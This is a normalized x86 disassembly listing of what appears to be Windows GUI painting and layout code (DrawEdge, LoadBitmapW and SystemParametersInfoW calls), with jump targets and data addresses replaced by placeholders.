mov edx [ eax - 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4634d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
xor ecx ecx
mov edx 0x1
call sub_432b28
sub_464cb8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_465632
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4a ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e300
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_46df1c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_46df1c
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call j_sub_44a294
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_46d5ac
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_46df1c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e300
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x18 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ebx [ eax + 0x3c ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x18 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x14 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x32 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_44f6d8
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ebx [ eax + 0x48 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov esi [ eax + 0x48 ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
call sub_46df14
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_46df1c
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x20 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ebx [ eax + 0x3c ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_46df1c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e300
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
call sub_46df14
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_473a8c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
call sub_46def0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e300
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x38 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x56 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4a ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e300
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x20 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_471090
mov edx [ ebp + 0x8 ]
mov [ edx - 0x54 ] eax
xor eax eax
push ebp
push sub_46514c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x7ff8
push 0x0
call LoadBitmapW
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
call sub_4726b4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_46d5ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0x1c ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_44f6d8
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x50 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
call sub_46df1c
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4634d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x3c ]
mov eax [ ebp + 0x8 ]
sub ecx [ eax - 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0xc ]
sub ecx eax
sar ecx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0xc ]
movzx edx [ r-xdata ]
call sub_46d968
mov eax [ ebp + 0x8 ]
or [ eax - 0x38 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax + 0x48 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e488
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x48 ]
lea edi [ edx - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x20 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x3c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
movzx eax [ eax + 0x35 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_44fa34
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
xor edx edx
call sub_432b28
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc ecx 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x14 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x1c ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
pop ecx
call sub_46e254
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x50 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0xc ]
call sub_46d5ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
call sub_4481b0
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4634d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
or ecx 0xffffffff
xor edx edx
call sub_432b28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465639
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
xor ecx ecx
mov edx 0x1
call sub_432b28
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
movzx eax [ eax + 0x5c ]
call sub_462374
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_46e724
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ ebp - 0x4 ]
call sub_4634d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
sub_4657fc
push ebx
xor ebx ebx
mov edx [ eax + 0x60 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x78 ] 0x0
je r-xdata
call sub_466650
test eax eax
je r-xdata
mov ebx [ edx + 0x78 ]
jmp r-xdata
mov edx [ edx + 0x60 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x44 ]
sub_46582c
push ebp
mov ebp esp
add esp 0xfffffe0c
mov [ ebp - 0x1f4 ] 0x1f4
push 0x0
lea eax [ ebp - 0x1f4 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoW
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ ebp - 0x11c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x118 ]
mov [ eax ] edx
sub_465878
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor eax eax
mov [ ebp - 0x24 ] eax
mov ebx [ ebp + 0x8 ]
add ebx 0xffffffe4
xor eax eax
push ebp
push sub_465c39
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
xor edx edx
mov [ eax ] edx
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push 0x0
mov eax [ ebx ]
movzx eax [ eax + 0x39 ]
mov edx [ ebx ]
movzx edx [ edx + 0x35 ]
lea edx [ edx * 8 + rw-data ]
mov eax [ edx + eax * 4 ]
push eax
push 0xb
mov eax [ ebx ]
call sub_46342c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov eax [ eax + 0x30 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0xe12
mov eax [ ebx ]
movzx eax [ eax + 0x39 ]
mov edx [ ebx ]
movzx edx [ edx + 0x35 ]
lea edx [ edx * 8 + rw-data ]
mov eax [ edx + eax * 4 ]
push eax
push 0xb
mov eax [ ebx ]
call sub_46342c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
add [ edx ] eax
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
add [ edx ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push 0x0
push 0x0
push 0xd
mov eax [ ebx ]
call sub_46342c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ ebp - 0x8 ]
add [ eax ] edx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0xe11
push 0x0
push 0xd
mov eax [ ebx ]
call sub_46342c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
add [ edx ] eax
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0xe11
push 0x1
push 0xe
mov eax [ ebx ]
call sub_46342c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
add [ edx ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push 0x0
push 0x1
push 0x10
mov eax [ ebx ]
call sub_46342c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ ebp - 0x8 ]
add [ eax ] edx
mov eax [ ebx ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call j_sub_44a294
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
xor ecx ecx
mov edx 0x10
call sub_447ae4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x28 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push 0x0
push 0x0
push 0xf
mov eax [ ebx ]
call sub_46342c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0xe11
push 0x0
push 0xf
mov eax [ ebx ]
call sub_46342c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
